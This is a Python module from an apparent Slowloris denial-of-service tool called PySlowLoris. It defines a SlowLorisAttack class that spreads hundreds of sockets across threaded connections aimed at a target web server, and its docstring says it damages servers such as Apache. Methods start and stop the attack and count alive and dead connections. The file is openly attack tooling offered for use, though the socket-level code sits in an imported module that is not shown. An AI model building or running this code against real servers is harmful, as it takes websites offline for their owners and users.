#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
MIT License

Copyright (c) 2017 Maxim Krivich

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

from .connection import Connection
from PySlowLoris import logger


class SlowLorisAttack(object):
    """
        SlowLoris this class implement a HTTP vulnerability and damage different https based web-servers like a
        Apache 1.x, Apache 2.x and etc.
    """

    def __init__(self, target, sockets=300, connections=2):
        if not (0 < sockets < 1000):
            raise ValueError('Invalid socket count {}'.format(sockets))

        if not (1 <= connections <= 10):
            raise ValueError('Invalid connection count {}'.format(connections))

        sc = sockets // connections
        self.connections = [Connection(target, sc) for _ in range(connections)]

    def __del__(self):
        while len(self.connections):
            try:
                del self.connections[-1]
            except Exception as ex:
                logger.exception(ex)

    def start_attack(self):
        # run connections
        for con in self.connections:
            con.daemon = True
            con.start()

    def get_counters(self):
        return {"alive": sum([c.get_counter()["alive"] for c in self.connections]),
                "died": sum([c.get_counter()["died"] for c in self.connections]),
                "requests": sum([c.get_counter()["requests"] for c in self.connections])}

    def stop_attack(self):
        for con in self.connections:
            con.stop()
        del self
